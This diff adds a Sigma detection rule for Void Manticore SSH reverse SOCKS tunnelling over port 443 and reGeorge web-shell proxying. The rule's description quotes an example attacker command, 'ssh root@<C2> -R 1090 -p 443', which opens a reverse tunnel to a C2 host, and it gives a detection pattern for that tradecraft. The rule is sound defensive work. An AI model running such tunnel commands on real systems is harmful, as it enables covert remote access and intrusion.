@@ -1,0 +1,39 @@
+title: Void Manticore SSH Reverse SOCKS Tunnel over Port 443 and reGeorge Internal Proxy
+id: 957ce8e8-2a8c-431f-9713-5372c5ce30d9
+status: experimental
+description: |
+    Detects Void Manticore (Storm-0842) command-and-control tunneling: on some hosts the actor runs an
+    OpenSSH client configured as a reverse SOCKS proxy over port 443, e.g.
+    'ssh root@<C2> -R 1090 -p 443 -o ServerAliveInterval=60' and '-R 1080', tunneling operator access
+    through an HTTPS-looking port (T1572 Protocol Tunneling). On the web tier it deploys the reGeorge web
+    shell to create a SOCKS proxy into the internal network and routes follow-on operator traffic
+    (including RDP) through the compromised internet-facing server (T1090.001 Internal Proxy). Keys on
+    ssh.exe command lines carrying reverse-tunnel (-R) options combined with '-p 443' - outbound SSH on
+    443 with a reverse tunnel from a server is anomalous. Requires process-creation telemetry with
+    command line (Sysmon EID 1 / Security 4688).
+references:
+    - https://research.checkpoint.com/2024/bad-karma-no-justice-void-manticore-destructive-activities-in-israel/
+    - https://blog.checkpoint.com/research/unveiling-void-manticore-structured-collaboration-between-espionage-and-destruction-in-mois/
+author: mena-detection-library
+date: 2026-08-30
+tags:
+    - attack.command-and-control
+    - attack.t1572
+    - attack.t1090.001
+    - mena-detection-library.void-manticore
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection_ssh:
+        Image|endswith: '\ssh.exe'
+    selection_revtunnel:
+        CommandLine|contains: ' -R '
+    selection_port443:
+        CommandLine|contains: '-p 443'
+    condition: selection_ssh and selection_revtunnel and selection_port443
+falsepositives:
+    - Legitimate administrators establishing SSH reverse tunnels over 443 for remote management -
+      allowlist known source hosts, destinations, and admin accounts; unexpected on a public web server
+    - DevOps automation that forwards ports over SSH - baseline expected tunneling patterns
+level: high
